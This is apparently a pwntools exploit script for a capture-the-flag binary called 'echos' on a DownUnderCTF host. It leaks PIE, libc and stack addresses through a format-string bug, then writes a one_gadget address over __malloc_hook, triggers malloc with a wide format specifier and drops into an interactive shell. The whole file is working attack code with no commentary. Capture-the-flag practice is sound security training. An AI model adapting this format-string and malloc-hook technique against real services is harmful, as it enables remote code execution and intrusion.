#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('echos')
libc = ELF('./libc.so.6')
# p = process(elf.path)
# gdb.attach(p, 'init-gef\npie break *0x861')
p = remote('chal.duc.tf', 30001)

p.sendline("%18$p|%19$p|%16$p")
leaks = [ int(x, 16) for x in p.recvline(False).split("|") ]
pie_base = leaks[0] - 0x890
libc_base = leaks[1] - 0x21b97
stack_ret_addr = leaks[2] - 0xe0 + 0x8

log.info("PIE: 0x{:x}".format(pie_base))
log.info("Libc: 0x{:x}".format(libc_base))
log.info("Stack Ret Addr: 0x{:x}".format(stack_ret_addr))

system = libc_base + libc.symbols['system']
one_gadget = libc_base+0x4f3c2

malloc_hook = libc_base + 0x3ebc30

# p.sendline("A"*8 + "%8$p|")

# writes = {
# 	stack_ret_addr: one_gadget
# }

writes = {
	malloc_hook: one_gadget
}

payload = fmtstr_payload(offset=8, writes=writes, write_size="short")
print repr(payload), len(payload)

p.send(payload[:63])

# p.recvuntil("\x7f")

p.sendline("%100000c") # Trigger malloc inside printf

p.interactive()
p.close()

